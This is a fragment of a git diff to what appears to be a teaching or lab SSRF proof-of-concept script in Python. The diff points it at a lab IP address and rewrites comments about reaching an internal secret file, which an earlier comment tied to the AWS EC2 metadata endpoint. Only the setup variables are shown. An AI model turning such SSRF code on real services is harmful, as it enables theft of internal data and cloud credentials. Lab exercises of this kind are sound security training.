@@ -6,11 +6,10 @@ Author: Omar Santos @santosomar
 import requests
 
 # The URL of the vulnerable web service.
-vulnerable_url = 'http://127.0.0.1:5000'
+vulnerable_url = 'http://10.6.6.20:5000'
 
 # The internal URL that the attacker wants to access.
-# AWS EC2 instances use this URL to provide instance metadata.
-# This data should be inaccessible from outside the EC2 instance.
+# This is to simulate that this data (secret.txt) should be inaccessible from attacker's network.
 internal_url = 'https://internal.secretcorp.org/secret.txt'
 
 # The attacker constructs the exploit URL by appending the internal URL
